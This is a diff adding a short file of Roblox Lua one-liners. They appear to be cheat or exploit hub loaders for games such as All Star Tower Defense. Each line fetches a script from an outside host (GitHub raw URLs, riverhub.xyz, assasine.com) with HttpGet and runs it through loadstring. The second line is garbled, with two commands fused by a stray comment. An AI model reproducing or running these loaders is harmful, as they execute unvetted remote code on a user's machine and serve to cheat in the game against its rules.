@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KarmaPanda/Roblox/main/astd-aio.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KarmaPanda/Roblox/main/astd-aio.lua"))() --River Hubloadstring(game:HttpGet("https://raw.githubusercontent.com/Xyrkey/chicken-hub/main/king-legacy"))();
+loadstring(game:HttpGet("http://riverhub.xyz/" .. tostring(game.PlaceId) .. ".lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rubic21/scriptpro/main/e"))();
+loadstring(game:HttpGet("http://assasine.com/Scripts/All%20Star%20Tower%20Defense.lua", true))();
